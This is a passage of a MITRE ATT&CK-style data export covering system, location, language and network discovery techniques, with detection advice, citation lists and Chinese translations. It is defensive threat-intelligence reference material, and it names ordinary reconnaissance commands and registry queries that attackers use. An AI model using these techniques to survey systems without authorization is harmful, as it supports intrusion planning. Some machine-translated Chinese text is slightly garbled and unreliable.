FELIXROOT July 2018),(Citation: Unit 42 Hildegard Malware),(Citation: F-Secure BlackEnergy 2014),(Citation: ESET Attor Oct 2019),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Cyberreason Anchor December 2019),(Citation: ATT TeamTNT Chimaera September 2020),(Citation: Cybereason Valak May 2020),(Citation: TrendMicro TropicTrooper 2015),(Citation: CME Github September 2018),(Citation: ATT QakBot April 2021),(Citation: Checkpoint Dridex Jan 2021),(Citation: Trend Micro Tick November 2019),(Citation: FinFisher Citation),(Citation: ESET OceanLotus Mar 2019),(Citation: Microsoft DUBNIUM July 2016),(Citation: Securelist Dtrack),(Citation: ESET Zebrocy May 2019),(Citation: McAfee Babuk February 2021),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Palo Alto Comnie),(Citation: Malwarebytes IssacWiper CaddyWiper March 2022 ),(Citation: FireEye Metamorfo Apr 2018),(Citation: Novetta Blockbuster),(Citation: Palo Alto DNS Requests),(Citation: Gigamon Berserk Bear October 2021),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: Qualys Hermetic Wiper March 2022),(Citation: FireEye admin@338),(Citation: TechNet Dir),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Forcepoint Monsoon),(Citation: Palo Alto menuPass Feb 2017),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Rewterz Sidewinder COVID-19 June 2020),(Citation: Scarlet Mimic Jan 2016),(Citation: Trustwave GoldenSpy June 2020),(Citation: Github PowerShell Empire),(Citation: Unit 42 BackConfig May 2020),(Citation: CheckPoint SpeakUp Feb 2019),(Citation: Kaspersky Turla Aug 2014),(Citation: Cybereason StrifeWater Feb 2022),(Citation: Symantec Naid June 2012),(Citation: McAfee Gold Dragon),(Citation: FireEye APT28),(Citation: Trend Micro KillDisk 1),(Citation: Radware Micropsia July 2018),(Citation: Bitdefender APT28 Dec 2015),(Citation: ESET Kobalos Jan 2021),(Citation: Accenture MUDCARP March 2019),(Citation: McAfee GhostSecret),(Citation: ESET Grandoreiro April 2020),(Citation: Microsoft PLATINUM April 2016),(Citation: Eset Ramsay May 2020),(Citation: Mandiant UNC3313 Feb 2022),(Citation: Unit 42 Bisonal July 2018),(Citation: Talos MuddyWater May 2019),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: SentinelLabs reversing run-only applescripts 2021),(Citation: Medium KONNI Jan 2020),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Unit 42 BadPatch Oct 2017),(Citation: Secureworks GOLD KINGSWOOD September 2018),(Citation: NCC Group Team9 June 2020),(Citation: Unit42 Azorult Nov 2018),(Citation: GitHub Pupy),(Citation: Kaspersky ShadowPad Aug 2017),(Citation: Symantec Buckeye),(Citation: NCCGroup RokRat Nov 2018),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Talos GravityRAT),(Citation: ESET OceanLotus),(Citation: Talos Kimsuky Nov 2021),(Citation: Prevailion EvilNum May 2020),(Citation: Unit 42 Nokki Oct 2018),(Citation: Symantec Orangeworm April 2018),(Citation: ESET DazzleSpy Jan 2022),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: Kaspersky Sodin July 2019),(Citation: Securelist Denis April 2017),(Citation: CyberBit Dtrack),(Citation: Microsoft GALLIUM December 2019),(Citation: FireEye APT30),(Citation: Leonardo Turla Penquin May 2020),(Citation: PWC KeyBoys Feb 2017),(Citation: RedCanary Mockingbird May 2020),(Citation: Symantec Linfo May 2012),(Citation: ESET Casbaneiro Oct 2019),(Citation: Unit 42 KerrDown February 2019),(Citation: Talos Cobalt Group July 2018),(Citation: FireEye APT10 Sept 2018),(Citation: Accenture Hogfish April 2018),(Citation: Unit42 BabyShark Feb 2019),(Citation: Trend Micro Muddy Water March 2021),(Citation: sentinelone shlayer to zshlayer),(Citation: Palo Alto Sofacy 06-2018),(Citation: ESET GreyEnergy Oct 2018),(Citation: CISA Zebrocy Oct 2020),(Citation: BlackBerry Bahamut),(Citation: Microsoft FinFisher March 2018),",系统信息发现,攻击者可能会尝试获取有关操作系统和硬件的详细信息，包括版本、补丁、修补程序、服务包和架构。攻击者可以在自动发现期间使用来自 [系统信息发现](https://attack.mitre.org/techniques/T1082) 的信息来塑造后续行为，包括攻击者是否完全感染目标和/或尝试具体行动。 [Systeminfo](https://attack.mitre.org/software/S0096) 等工具可用于收集详细的系统信息。如果以特权访问权限运行，则可以通过 macOS 上的 <code>systemsetup</code> 配置工具收集系统数据的细分。例如，具有用户级访问权限的攻击者可以执行 <code>df -aH</code> 命令来获取当前安装的磁盘和相关联的可用空间。攻击者还可以利用网络设备上的 [网络设备 CLI](https://attack.mitre.org/techniques/T1059/008) 来收集详细的系统信息（例如 <code>show version</code>）。（引文: US-CERT-TA18-106A) [系统信息发现](https://attack.mitre.org/techniques/T1082) 结合从其他形式的发现和侦察收集的信息可以推动有效载荷的开发和隐藏。（引文： OSX.FairyTale）（引用：20 macOS 常用工具和技术）基础设施即服务 (IaaS) 云提供商，例如 AWS、GCP 和 Azure，允许通过 API 访问实例和虚拟机信息。成功通过身份验证的 API 调用可以返回特定实例的操作系统平台和状态或虚拟机的模型视图等数据。（引用：Amazon Describe Instance）（引用：Google Instances Resource）（引用：Microsoft 虚拟机 API）
T1614,System Location Discovery,"
Adversaries may gather information in an attempt to calculate the geographical location of a victim host. Adversaries may use the information from [System Location Discovery](https://attack.mitre.org/techniques/T1614) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

Adversaries may attempt to infer the location of a system using various system checks, such as time zone, keyboard layout, and/or language settings.(Citation: FBI Ragnar Locker 2020)(Citation: Sophos Geolocation 2016)(Citation: Bleepingcomputer RAT malware 2020) Windows API functions such as <code>GetLocaleInfoW</code> can also be used to determine the locale of the host.(Citation: FBI Ragnar Locker 2020) In cloud environments, an instance's availability zone may also be discovered by accessing the instance metadata service from the instance.(Citation: AWS Instance Identity Documents)(Citation: Microsoft Azure Instance Metadata 2021)

Adversaries may also attempt to infer the location of a victim host using IP addressing, such as via online geolocation IP-lookup services.(Citation: Securelist Trasparent Tribe 2020)(Citation: Sophos Geolocation 2016)",https://attack.mitre.org/techniques/T1614,01 April 2021,15 October 2021,1.0,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system location information. Remote access tools with built-in features may interact directly with the Windows API, such as calling <code> GetLocaleInfoW</code> to gather information.(Citation: FBI Ragnar Locker 2020)

Monitor traffic flows to geo-location service provider sites, such as ip-api and ipinfo.","IaaS, Linux, Windows, macOS","Command: Command Execution, Instance: Instance Metadata, Process: OS API Execution, Process: Process Creation",False,,,"Hiroki Nagahama, NEC Corporation; Katie Nickels, Red Canary; Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India; Wes Hurd",User,,,,,,"(Citation: BlackBerry Amadey 2020),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Group IB GrimAgent July 2021),(Citation: Prevailion DarkWatchman 2021),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Korean FSI TA505 2020),(Citation: FBI Ragnar Locker 2020),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Malwarebytes Saint Bot April 2021),",系统位置发现,攻击者可能会收集信息以试图计算受害主机的地理位置。攻击者可以在自动发现期间使用来自 [系统位置发现](https://attack.mitre.org/techniques/T1614) 的信息来塑造后续行为，包括攻击者是否完全感染目标和/或尝试具体行动。攻击者可能会尝试使用各种系统检查来推断系统的位置，例如时区、键盘布局和/或语言设置。（引用：FBI Ragnar Locker 2020）（引用：Sophos Geolocation 2016）（引用：Bleepingcomputer RAT 恶意软件2020) Windows API 函数，如 <code>GetLocaleInfoW</code> 也可用于确定主机的区域设置。（引用：FBI Ragnar Locker 2020）在云环境中，也可以通过访问实例的可用区来发现来自实例的实例元数据服务。（引用：AWS Instance Identity Documents）（引用：Microsoft Azure Instance Metadata 2021）攻击者还可能尝试使用 IP 寻址来推断受害主机的位置，例如通过在线地理定位 IP 查找服务。 （引文：Securelist Trasparent Tribe 2020）（引文：Sophos Geolocation 2016）
T1614.001,System Location Discovery: System Language Discovery,"Adversaries may attempt to gather information about the system language of a victim in order to infer the geographical location of that host. This information may be used to shape follow-on behaviors, including whether the adversary infects the target and/or attempts specific actions. This decision may be employed by malware developers and operators to reduce their risk of attracting the attention of specific law enforcement agencies or prosecution/scrutiny from other entities.(Citation: Malware System Language Check)

There are various sources of data an adversary could use to infer system language, such as system defaults and keyboard layouts. Specific checks will vary based on the target and/or adversary, but may involve behaviors such as [Query Registry](https://attack.mitre.org/techniques/T1012) and calls to [Native API](https://attack.mitre.org/techniques/T1106) functions.(Citation: CrowdStrike Ryuk January 2019) 

For example, on a Windows system adversaries may attempt to infer the language of a system by querying the registry key <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\Language</code> or parsing the outputs of Windows API functions <code>GetUserDefaultUILanguage</code>, <code>GetSystemDefaultUILanguage</code>, <code>GetKeyboardLayoutList</code> and <code>GetUserDefaultLangID</code>.(Citation: Darkside Ransomware Cybereason)(Citation: Securelist JSWorm)(Citation: SecureList SynAck Doppelgänging May 2018)

On a macOS or Linux system, adversaries may query <code>locale</code> to retrieve the value of the <code>$LANG</code> environment variable.",https://attack.mitre.org/techniques/T1614/001,18 August 2021,15 October 2021,1.0,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system language information. This may include calls to various API functions and interaction with system configuration settings such as the Windows Registry.","Linux, Windows, macOS","Command: Command Execution, Process: OS API Execution, Process: Process Creation, Windows Registry: Windows Registry Key Access",True,T1614,,"Harshal Tupsamudre, Qualys",User,,,,,,"(Citation: CrowdStrike Ryuk January 2019),(Citation: SecureList SynAck Doppelgänging May 2018),(Citation: trendmicro xcsset xcode project 2020),(Citation: McAfee Cuba April 2021),(Citation: Microsoft NICKEL December 2021),(Citation: Unit42 Molerat Mar 2020),(Citation: NCC Group Team9 June 2020),(Citation: McAfee Maze March 2020),(Citation: Arxiv Avaddon Feb 2021),(Citation: FireEye FiveHands April 2021),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Mcafee Clop Aug 2019),(Citation: ClearSky Lazarus Aug 2020),(Citation: Talos Zeus Panda Nov 2017),(Citation: Group IB GrimAgent July 2021),(Citation: NTT Security Flagpro new December 2021),(Citation: Cylance Dust Storm),(Citation: Kaspersky Sodin July 2019),(Citation: BleepingComputer Molerats Dec 2020),",系统位置发现：系统语言发现,攻击者可能会尝试收集有关受害者系统语言的信息，以推断该主机的地理位置。此信息可用于塑造后续行为，包括对手是否感染目标和/或尝试特定行动。恶意软件开发人员和运营商可能会采用此决定来降低他们引起特定执法机构注意或其他实体起诉/审查的风险。（引文：恶意软件系统语言检查）对手可以使用各种数据源来推断系统语言，例如系统默认值和键盘布局。具体检查将根据目标和/或对手而有所不同，但可能涉及 [Query Registry](https://attack.mitre.org/techniques/T1012) 和调用 [Native API](https:// attack.mitre.org/techniques/T1106）函数。（引用：CrowdStrike Ryuk 2019 年 1 月）例如，在 Windows 系统上，攻击者可能会尝试通过查询注册表项 <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet 来推断系统的语言\Control\Nls\Language</code> 或解析 Windows API 函数 <code>GetUserDefaultUILanguage</code>、<code>GetSystemDefaultUILanguage</code>、<code>GetKeyboardLayoutList</code> 和 <code>GetUserDefaultLangID< 的输出/code>.(Citation: Darkside Ransomware Cybereason)(Citation: Securelist JSWorm)(Citation: SecureList SynAck Doppelgänging May 2018) 在 macOS 或 Linux 系统上，攻击者可以查询 <code>locale</code> 以检索<code>$LANG</code> 环境变量。
T1016,System Network Configuration Discovery,"Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).

Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).(Citation: US-CERT-TA18-106A)(Citation: Mandiant APT41 Global Intrusion )

Adversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. ",https://attack.mitre.org/techniques/T1016,31 May 2017,06 September 2022,1.5,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Further, {{LinkById|T1059.008} commands may also be used to gather system and network information with built-in features native to the network device platform.  Monitor CLI activity for unexpected or unauthorized use  commands being run by non-standard users from non-standard locations.  Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).","Linux, Network, Windows, macOS","Command: Command Execution, Process: OS API Execution, Process: Process Creation, Script: Script Execution",False,,,"Austin Clark, @c2defense",,,,CAPEC-309,,,"(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Cyberreason Anchor December 2019),(Citation: CISA SoreFang July 2016),(Citation: Cybereason Valak May 2020),(Citation: Kaspersky Adwind Feb 2016),(Citation: US-CERT BADCALL),(Citation: Cylance Shaheen Nov 2018),(Citation: Sophos New Ryuk Attack October 2020),(Citation: ESET Turla PowerShell May 2019),(Citation: Kaspersky Lyceum October 2021),(Citation: FoxIT Wocao December 2019),(Citation: CME Github September 2018),(Citation: TrendMicro Taidoor),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Trend Micro Tick November 2019),(Citation: Securelist Octopus Oct 2018),(Citation: Cofense Astaroth Sept 2018),(Citation: RATANKBA),(Citation: ESET LoudMiner June 2019),(Citation: AlienVault Sykipot 2011),(Citation: TrendMicro MacOS April 2018),(Citation: ThreatExpert Agent.btz),(Citation: Kaspersky QakBot September 2021),(Citation: ESET Operation Groundbait),(Citation: Talos Promethium June 2020),(Citation: Microsoft DUBNIUM July 2016),(Citation: Securelist Dtrack),(Citation: ESET Zebrocy May 2019),(Citation: Securelist Darkhotel Aug 2015),(Citation: Talos Olympic Destroyer 2018),(Citation: Symantec Waterbug Jun 2019),(Citation: Accenture Dragonfish Jan 2018),(Citation: Group IB Ransomware September 2020),(Citation: Trend Micro Trickbot Nov 2018),(Citation: FSecure Lokibot November 2019),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Cybereason Bazar July 2020),(Citation: Palo Alto Comnie),(Citation: DigiTrust NanoCore Jan 2017),(Citation: Novetta Blockbuster),(Citation: Symantec Hydraq Jan 2010),(Citation: Palo Alto DNS Requests),(Citation: Palo Alto T9000 Feb 2016),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Gigamon Berserk Bear October 2021),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: Trend Micro DRBControl February 2020),(Citation: Kaspersky TajMahal April 2019),(Citation: FireEye admin@338),(Citation: ESET ForSSHe December 2018),(Citation: Unit42 Xbash Sept 2018),(Citation: Crowdstrike Qakbot October 2020),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: FireEye APT34 Dec 2017),(Citation: Unit 42 C0d0so0 Jan 2016),(Citation: Bleeping Computer - Ryuk WoL),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: ESET LightNeuron May 2019),(Citation: Forcepoint Monsoon),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Unit 42 NOKKI Sept 2018),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Zscaler Higaisa 2020),(Citation: McAfee Cuba April 2021),(Citation: McAfee Sharpshooter December 2018),(Citation: CheckPoint Naikon May 2020),(Citation: Secureworks Karagany July 2019),(Citation: Github PowerShell Empire),(Citation: CheckPoint Volatile Cedar March 2015),(Citation: S2 Grupo TrickBot June 2017),(Citation: FireEye Ryuk and Trickbot January 2019),(Citation: Symantec Dragonfly),(Citation: CheckPoint SpeakUp Feb 2019),(Citation: McAfee Night Dragon),(Citation: ESET PipeMon May 2020),(Citation: Unit 42 Playbook Dec 2017),(Citation: McAfee Shamoon December 2018),(Citation: Symantec Volgmer Aug 2014),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: Securelist Calisto July 2018),(Citation: Symantec Naid June 2012),(Citation: McAfee Gold Dragon),(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021),(Citation: McAfee Oceansalt Oct 2018),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Palo Alto OilRig May 2016),(Citation: Talos Bisonal Mar 2020),(Citation: ESET Industroyer),(Citation: McAfee Lazarus Nov 2020),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Unit 42 VERMIN Jan 2018),(Citation: Check Point APT35 CharmPower January 2022),(Citation: 360 Machete Sep 2020),(Citation: Antiy CERT Ramsay April 2020),(Citation: SecureWorks WannaCry Analysis),(Citation: JPCert TSCookie March 2018),(Citation: Proofpoint TA505 October 2019),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: DigiTrust Agent Tesla Jan 2017),(Citation: Medium Anchor DNS July 2020),(Citation: ESET Kobalos Jan 2021),(Citation: Unit 42 PingPull Jun 2022),(Citation: Accenture MUDCARP March 2019),(Citation: Github Koadic),(Citation: ESET Okrum July 2019),(Citation: Avira Mustang Panda January 2020),(Citation: ESET Carbon Mar 2017),(Citation: Unit 42 Kazuar May 2017),(Citation: BiZone Lizar May 2021),(Citation: McAfee GhostSecret),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: CERT-FR PYSA April 2020),(Citation: Palo Alto Reaver Nov 2017),(Citation: BlackBerry Amadey 2020),(Citation: NCC Group APT15 Alive and Strong),(Citation: Cybereason Cobalt Kitty 2017),(Citation: GovCERT Carbon May 2016),(Citation: US-CERT TA18-074A),(Citation: Talent-Jump Clambling February 2020),(Citation: ESET Grandoreiro April 2020),(Citation: Talos Konni May 2017),(Citation: Red Canary NETWIRE January 2020),(Citation: Check Point APT34 April 2021),(Citation: Symantec Catchamas April 2018),(Citation: Proofpoint ZeroT Feb 2017),(Citation: Microsoft PLATINUM April 2016),(Citation: Baumgartner Naikon 2015),(Citation: CheckPoint Bandook Nov 2020),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Checkpoint IndigoZebra July 2021),(Citation: Cylance Dust Storm),(Citation: Emissary Trojan Feb 2016),(Citation: Unit 42 Bisonal July 2018),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Trend Micro IXESHE 2012),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: Unit 42 QUADAGENT July 2018),(Citation: TechNet Arp),(Citation: FireEye FIN6 Apr 2019),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: Kaspersky CactusPete Aug 2020),(Citation: evolution of pirpi),(Citation: PWC WellMess July 2020),(Citation: Malwarebytes Higaisa 2020),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Microsoft NICKEL December 2021),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Secureworks GOLD KINGSWOOD September 2018),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: Unit 42 Lucifer June 2020),(Citation: Unit42 Azorult Nov 2018),(Citation: GitHub Pupy),(Citation: Securelist MuddyWater Oct 2018),(Citation: ATT Sidewinder January 2021),(Citation: Kaspersky ShadowPad Aug 2017),(Citation: Group IB APT 41 June 2021),(Citation: Symantec W32.Duqu),(Citation: Proofpoint NETWIRE December 2020),(Citation: Kaspersky Turla),(Citation: Lotus Blossom Jun 2015),(Citation: NCSC Cyclops Blink February 2022),(Citation: Symantec Buckeye),(Citation: ESET InvisiMole June 2020),(Citation: ESET InvisiMole June 2018),(Citation: Palo Alto MoonWind March 2017),(Citation: ESET ComRAT May 2020),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: CrowdStrike IceApple May 2022),(Citation: Cybereason Soft Cell June 2019),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: FireEye MuddyWater Mar 2018),(Citation: Trend Micro MacOS Backdoor November 2020),(Citation: Talos GravityRAT),(Citation: Nltest Manual),(Citation: FOX-IT May 2016 Mofang),(Citation: Novetta Blockbuster Loaders),(Citation: Group IB GrimAgent July 2021),(Citation: Talos Kimsuky Nov 2021),(Citation: NTT Security Flagpro new December 2021),(Citation: US-CERT FALLCHILL Nov 2017),(Citation: ESET Dukes October 2019),(Citation: GitHub PoshC2),(Citation: Awake Security Avaddon),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Fortinet Diavol July 2021),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: Volexity PowerDuke November 2016),(Citation: Symantec Orangeworm April 2018),(Citation: F-Secure The Dukes),(Citation: ESET DazzleSpy Jan 2022),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: Palo Alto Shamoon Nov 2016),(Citation: CyberBit Dtrack),(Citation: CrowdStrike Ryuk January 2019),(Citation: ESET Gelsemium June 2021),(Citation: Rancor Unit42 June 2018),(Citation: Trend Micro Cyclops Blink March 2022),(Citation: Mandiant APT1),(Citation: Debian nbtscan Nov 2019),(Citation: CISA WellMail July 2020),(Citation: Forcepoint Felismus Mar 2017),(Citation: Trend Micro TeamTNT),(Citation: SecTools nbtscan June 2003),(Citation: Leonardo Turla Penquin May 2020),(Citation: ClearSky Siamesekitten August 2021),(Citation: PWC KeyBoys Feb 2017),(Citation: Lazarus RATANKBA),(Citation: Talos Frankenstein June 2019),(Citation: CarbonBlack Conti July 2020),(Citation: objsee mac malware 2017),(Citation: ESET Machete July 2019),(Citation: Microsoft POLONIUM June 2022),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: TrendMicro EarthLusca 2022),(Citation: NCSC GCHQ Small Sieve Jan 2022),(Citation: FireEye APT41 Aug 2019),(Citation: US-CERT KEYMARBLE Aug 2018),(Citation: Proofpoint Leviathan Oct 2017),(Citation: TrendMicro POWERSTATS V3 June 2019),(Citation: Malwarebytes Saint Bot April 2021),(Citation: Dell TG-3390),(Citation: Talos Cobalt Group July 2018),(Citation: FireEye APT10 Sept 2018),(Citation: F-Secure BlackEnergy 2014),(Citation: Unit42 BabyShark Feb 2019),(Citation: ASERT Donot March 2018),(Citation: Red Canary Hospital Thwarted Ryuk October 2020),(Citation: Securelist BlackEnergy Nov 2014),(Citation: Dragos Crashoverride 2018),(Citation: NCC Group Chimera January 2021),(Citation: Symantec Trojan.Hydraq Jan 2010),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: ESET GreyEnergy Oct 2018),(Citation: US-CERT HOTCROISSANT February 2020),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: CISA WellMess July 2020),(Citation: GitHub Sliver Ifconfig),(Citation: Carbon Black HotCroissant April 2020),(Citation: Check Point Pay2Key November 2020),(Citation: IBM Ransomware Trends September 2020),(Citation: SentinelLabs Agent Tesla Aug 2020),(Citation: Malwarebytes Dyreza November 2015),(Citation: Palo Alto OilRig Oct 2016),",系统网络配置发现,攻击者可能会查找有关他们访问的系统的网络配置和设置的详细信息，例如 IP 和/或 MAC 地址，或通过远程系统的信息发现。存在几个可用于收集此信息的操作系统管理实用程序。示例包括 [Arp](https://attack.mitre.org/software/S0099)、[ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack. mitre.org/software/S0101)、[nbtstat](https://attack.mitre.org/software/S0102) 和 [route](https://attack.mitre.org/software/S0103)。攻击者还可以利用网络设备上的 [网络设备 CLI](https://attack.mitre.org/techniques/T1059/008) 来收集有关配置和设置的信息，例如配置接口的 IP 地址和静态/动态路由（例如<code>show ip route</code>、<code>show ip interface</code>）。（引用：US-CERT-TA18-106A）（引用：Mandiant APT41 Global Intrusion）攻击者可能使用来自[系统网络配置发现](https://attack.mitre.org/techniques/T1016) 在自动发现期间塑造后续行为，包括确定目标网络内的某些访问以及下一步要执行的操作。
T1016.001,System Network Configuration Discovery: Internet Connection Discovery,"Adversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as using [Ping](https://attack.mitre.org/software/S0097), <code>tracert</code>, and GET requests to websites.

Adversaries may use the results and responses from these requests to determine if the system is capable of communicating with their C2 servers before attempting to connect to them. The results may also be used to identify routes, redirectors, and proxy servers.",https://attack.mitre.org/techniques/T1016/001,17 March 2021,25 March 2021,1.0,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Command and Control, based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to check Internet connectivity.","Linux, Windows, macOS","Command: Command Execution, Process: Process Creation",True,T1016,,,User,,,,,,"(Citation: McAfee Sharpshooter December 2018),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: Microsoft NICKEL December 2021),(Citation: Kaspersky QakBot September 2021),(Citation: ESET ComRAT May 2020),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Kaspersky Lyceum October 2021),(Citation: FoxIT Wocao December 2019),(Citation: Microsoft Actinium February 2022),(Citation: Symantec Shuckworm January 2022),(Citation: Mandiant UNC3890 Aug 2022),",系统网络配置发现：Internet 连接发现,攻击者可能会检查受感染系统上的 Internet 连接。这可以在自动发现期间执行，并且可以通过多种方式完成，例如使用 [Ping](https://attack.mitre.org/software/S0097)、<code>tracert</code> 和对网站的 GET 请求.攻击者可能会使用这些请求的结果和响应来确定系统是否能够在尝试连接到他们的 C2 服务器之前与其进行通信。结果还可用于识别路由、重定向器和代理服务器。
T1049,System Network Connections Discovery,"Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. 

An adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.(Citation: Amazon AWS VPC Guide)(Citation: Microsoft Azure Virtual Network Overview)(Citation: Google VPC Overview) Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.

Utilities and commands that acquire this information include [netstat](https://attack.mitre.org/software/S0104), ""net use,"" and ""net session"" with [Net](https://attack.mitre.org/software/S0039). In Mac and Linux, [netstat](https://attack.mitre.org/software/S0104) and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to ""net session"". Additionally, built-in features native to network devices and [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) may be used (e.g. <code>show ip sockets</code>, <code>show tcp brief</code>).(Citation: US-CERT-TA18-106A)",https://attack.mitre.org/techniques/T1049,31 May 2017,06 September 2022,2.4,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Further, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands may also be used to gather system and network information with built-in features native to the network device platform.  Monitor CLI activity for unexpected or unauthorized use commands being run by non-standard users from non-standard locations. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).","IaaS, Linux, Network, Windows, macOS","Command: Command Execution, Process: OS API Execution, Process: Process Creation",False,,,"Austin Clark, @c2defense; Praetorian",,,,,,,"(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: ATT TeamTNT Chimaera September 2020),(Citation: Kaspersky Adwind Feb 2016),(Citation: Trend Micro Waterbear December 2019),(Citation: Talos Cobalt Strike September 2020),(Citation: ESET Turla PowerShell May 2019),(Citation: Kaspersky Lyceum October 2021),(Citation: FoxIT Wocao December 2019),(Citation: CME Github September 2018),(Citation: RATANKBA),(Citation: AlienVault Sykipot 2011),(Citation: Kaspersky QakBot September 2021),(Citation: Securelist Dtrack),(Citation: ESET Zebrocy May 2019),(Citation: McAfee Babuk February 2021),(Citation: FireEye Clandestine Fox),(Citation: Palo Alto Comnie),(Citation: NHS Digital Egregor Nov 2020),(Citation: FireEye admin@338),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: FireEye APT34 Dec 2017),(Citation: McAfee Cuba April 2021),(Citation: CheckPoint Naikon May 2020),(Citation: CIRCL PlugX March 2013),(Citation: Secureworks Karagany July 2019),(Citation: Github PowerShell Empire),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: CheckPoint SpeakUp Feb 2019),(Citation: Symantec Volgmer Aug 2014),(Citation: Kaspersky Turla Aug 2014),(Citation: McAfee Maze March 2020),(Citation: Palo 